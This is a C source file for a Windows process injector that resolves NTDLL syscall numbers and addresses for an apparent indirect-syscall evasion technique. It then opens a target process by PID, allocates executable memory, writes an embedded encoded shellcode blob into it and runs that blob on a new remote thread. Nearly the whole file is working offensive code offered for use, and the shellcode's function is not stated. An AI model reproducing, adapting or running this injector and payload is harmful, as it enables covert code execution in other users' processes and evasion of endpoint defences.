#include "NTheader.h"

DWORD NtCloseSSN;
DWORD NtOpenProcessSSN;
DWORD NtCreateThreadExSSN;
DWORD NtWriteVirtualMemorySSN;
DWORD NtWaitForSingleObjectSSN;
DWORD NtAllocateVirtualMemorySSN;

UINT_PTR NtCloseSyscall;
UINT_PTR NtOpenProcessSyscall;
UINT_PTR NtCreateThreadExSyscall;
UINT_PTR NtWriteVirtualMemorySyscall;
UINT_PTR NtWaitForSingleObjectSyscall;
UINT_PTR NtAllocateVirtualMemorySyscall;

/*-----------[GET MODULE]-----------*/
HMODULE getMod(IN LPCWSTR modName) {

    HMODULE hModule = NULL;

    info("trying to get a handle to %S...", modName);
    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        warn("failed to get a handle to the module, error:  , 0x%lx\n", GetLastError());
        return NULL;
    }

    else {
        okay("got a handle to the module!");
        info("\\___[ %S\n\t\\_ , 0x%p]\n", modName, hModule);
        return hModule;
    }

}


DWORD GetSSN(IN HMODULE hNTDLL, IN LPCSTR NtFunction) {

    DWORD NtFunctionSSN = NULL;
    UINT_PTR NtFunctionAddress = NULL;

    info("trying to get the address of %s...", NtFunction);
    NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);

    if (NtFunctionAddress == NULL) {
        warn("failed to get the address of %s", NtFunction);
        return NULL;
    }

    okay("got the address of %s!", NtFunction);
    info("getting SSN of %s...", NtFunction);
    NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 4))[0];
    okay("\\___[\n\t| %s\n\t|  , 0x%p+ , 0x4\n\t|____________________ , 0x%lx]\n", NtFunction, NtFunctionAddress, NtFunctionSSN);
    return NtFunctionSSN;
}
VOID IndirectPrelude(
    IN HMODULE hNTDLL,
    IN LPCSTR NtFunction,
    OUT DWORD* SSN,
    OUT UINT_PTR* Syscall
) {

    UINT_PTR NtFunctionAddress = NULL;
    BYTE SyscallOpcode[2] = { 0x0F, 0x05 };

    info("beginning indirect prelude...");
    info("trying to get the address of %s...", NtFunction);
    NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);

    if (NtFunctionAddress == NULL) {
        warn("[GetProcAddress] failed, error: 0x%lx", GetLastError());
        //return NULL;
    }

    okay("got the address of %s! (0x%p)", NtFunction, NtFunctionAddress);
    *SSN = ((PBYTE)(NtFunctionAddress + 4))[0];
    *Syscall = NtFunctionAddress + 0x12;

   /* if (memcmp(SyscallOpcode, *Syscall, sizeof(SyscallOpcode)) == 0) {
        okay("syscall signature (0x0F, 0x05) matched, found a valid syscall instruction!");
    }
    else {
        warn("expected syscall signature: 0x0f,0x05 didn't match.");
        //return NULL;
    }*/

    okay("got the SSN of %s (0x%lx)", NtFunction, *SSN);
    printf("\n\t| %s ", NtFunction);
    printf("\n\t|\n\t| ADDRESS\t| 0x%p\n\t| SYSCALL\t| 0x%p\n\t| SSN\t\t| 0x%lx\n\t|____________________________________\n\n", NtFunctionAddress, *Syscall, *SSN);

}



int main(int argc, char* argv[]) {
    DWORD    PID = 0;
    DWORD    TID = 0;
    HMODULE  hNTDLL = NULL;
    NTSTATUS STATUS = NULL;
    PVOID    rBuffer = NULL;
    HANDLE   hThread = NULL;
    HANDLE   hProcess = NULL;

    const UCHAR shellcode[] =
        "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
        "\xff\xff\xff\x48\xbb\x45\x1b\xfd\x5e\xab\x3d\x65\xf3\x48"
        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb9\x53\x7e"
        "\xba\x5b\xd5\xa5\xf3\x45\x1b\xbc\x0f\xea\x6d\x37\xa2\x13"
        "\x53\xcc\x8c\xce\x75\xee\xa1\x25\x53\x76\x0c\xb3\x75\xee"
        "\xa1\x65\x53\x76\x2c\xfb\x75\x6a\x44\x0f\x51\xb0\x6f\x62"
        "\x75\x54\x33\xe9\x27\x9c\x22\xa9\x11\x45\xb2\x84\xd2\xf0"
        "\x1f\xaa\xfc\x87\x1e\x17\x5a\xac\x16\x20\x6f\x45\x78\x07"
        "\x27\xb5\x5f\x7b\xb6\xe5\x7b\x45\x1b\xfd\x16\x2e\xfd\x11"
        "\x94\x0d\x1a\x2d\x0e\x20\x75\x7d\xb7\xce\x5b\xdd\x17\xaa"
        "\xed\x86\xa5\x0d\xe4\x34\x1f\x20\x09\xed\xbb\x44\xcd\xb0"
        "\x6f\x62\x75\x54\x33\xe9\x5a\x3c\x97\xa6\x7c\x64\x32\x7d"
        "\xfb\x88\xaf\xe7\x3e\x29\xd7\x4d\x5e\xc4\x8f\xde\xe5\x3d"
        "\xb7\xce\x5b\xd9\x17\xaa\xed\x03\xb2\xce\x17\xb5\x1a\x20"
        "\x7d\x79\xba\x44\xcb\xbc\xd5\xaf\xb5\x2d\xf2\x95\x5a\xa5"
        "\x1f\xf3\x63\x3c\xa9\x04\x43\xbc\x07\xea\x67\x2d\x70\xa9"
        "\x3b\xbc\x0c\x54\xdd\x3d\xb2\x1c\x41\xb5\xd5\xb9\xd4\x32"
        "\x0c\xba\xe4\xa0\x16\x11\x3c\x65\xf3\x45\x1b\xfd\x5e\xab"
        "\x75\xe8\x7e\x44\x1a\xfd\x5e\xea\x87\x54\x78\x2a\x9c\x02"
        "\x8b\x10\xdd\x78\xd9\x4f\x5a\x47\xf8\x3e\x80\xf8\x0c\x90"
        "\x53\x7e\x9a\x83\x01\x63\x8f\x4f\x9b\x06\xbe\xde\x38\xde"
        "\xb4\x56\x69\x92\x34\xab\x64\x24\x7a\x9f\xe4\x28\x3d\xca"
        "\x51\x06\xdd\x20\x63\x98\x5e\xab\x3d\x65\xf3";





    SIZE_T shellcodeSize = sizeof(shellcode) - 1;
    SIZE_T bytesWritten = 0;

    if (argc < 2) {
        warn("usage: %s <process>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    CLIENT_ID CID = { (HANDLE)PID, 0 };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };

    /*--------[GET SYSCALLS]--------*/
    hNTDLL = getMod(L"NTDLL");
    NtOpenProcessSSN = GetSSN(hNTDLL, "NtOpenProcess");
    IndirectPrelude(hNTDLL, "NtOpenProcess", &NtOpenProcessSSN, &NtOpenProcessSyscall);
    printf("%x", NtOpenProcessSyscall);

    NtAllocateVirtualMemorySSN = GetSSN(hNTDLL, "NtAllocateVirtualMemory");
    IndirectPrelude(hNTDLL, "NtAllocateVirtualMemory", &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);

    NtWriteVirtualMemorySSN = GetSSN(hNTDLL, "NtWriteVirtualMemory");
    IndirectPrelude(hNTDLL, "NtWriteVirtualMemory", &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);

    NtCreateThreadExSSN = GetSSN(hNTDLL, "NtCreateThreadEx");
    IndirectPrelude(hNTDLL, "NtCreateThreadEx", &NtCreateThreadExSSN, &NtCreateThreadExSyscall);

    NtWaitForSingleObjectSSN = GetSSN(hNTDLL, "NtWaitForSingleObject");
    IndirectPrelude(hNTDLL, "NtWaitForSingleObject", &NtWaitForSingleObjectSSN, &NtWaitForSingleObjectSyscall);

    NtCloseSSN = GetSSN(hNTDLL, "NtClose");
    IndirectPrelude(hNTDLL, "NtClose", &NtCloseSSN, &NtCloseSyscall);

    printf("%x, %x, %x, %x, %x, %x\n",NtOpenProcessSSN, NtAllocateVirtualMemorySSN, NtWriteVirtualMemorySSN, NtCreateThreadExSSN, NtWaitForSingleObjectSSN, NtCloseSSN);
  
    /*--------[PERFORM INJECTION]--------*/

    info("getting a handle on the process (%ld)...", PID);
    STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (!(STATUS == STATUS_SUCCESS)) {
        warn("[NtOpenProcess] failed to get a handle on the process (%ld), error:  , 0x%x", PID, STATUS);
        return EXIT_FAILURE;
    }
    okay("got a handle to the process!");
    info(" 0x%p]", hProcess);
    
    info("allocating buffer in process memory...");
    STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        warn("[NtAllocateVirtualMemory] failed to allocate memory, error:  , 0x%x", STATUS);
        goto CLEANUP;
    }

        STATUS = NtWriteVirtualMemory(hProcess, rBuffer, (PVOID)shellcode, shellcodeSize, &bytesWritten); /* can't use shellcodeSize here */
        if (STATUS != STATUS_SUCCESS) {
            warn("[NtWriteVirtualMemory] failed to write to allocated buffer, error:  , 0x%x", STATUS);
            goto CLEANUP;
        }
        info("Shellcode size: %zu", shellcodeSize);
        okay("wrote %zu-bytes to allocated buffer!", bytesWritten);
        info("Shellcode address: 0x%p", rBuffer);
        //(void)getchar();
        info("creating thread, beginning execution");
        STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
        if (STATUS != STATUS_SUCCESS) {
            warn("[NtCreateThreadEx] failed to create thread, error:  , 0x%x", STATUS);
            goto CLEANUP;
        }
        TID = GetThreadId(hThread);
        okay("thread created!");
        info(" %lu", TID);

        /*--------[CLEANUP & EXIT]--------*/
        info("waiting for thread to finish execution");
        STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
        if (STATUS != STATUS_SUCCESS) {
            warn("[NtWaitForSingleObject] failed to wait for object (hThread), error:  , 0x%x", STATUS);
            goto CLEANUP;
        }
        okay("thread finished execution!");

        goto CLEANUP;

    CLEANUP:

        info("beginning cleanup...");
        if (hProcess) {
            info("closing handle to process...");
            STATUS = NtClose(hProcess);
            if (STATUS != STATUS_SUCCESS) {
                warn("[NtClose] failed to close handle, error:  , 0x%x", STATUS);
                return EXIT_FAILURE;
            }
            okay("closed!");
        }

        if (hThread) {
            info("closing handle to thread...");
            STATUS = NtClose(hThread);
            if (STATUS != STATUS_SUCCESS) {
                warn("[NtClose] failed to close handle, error:  , 0x%x", STATUS);
                return EXIT_FAILURE;
            }
            okay("closed!");
        }

        okay("cleanup finished");
        return EXIT_SUCCESS;

    }
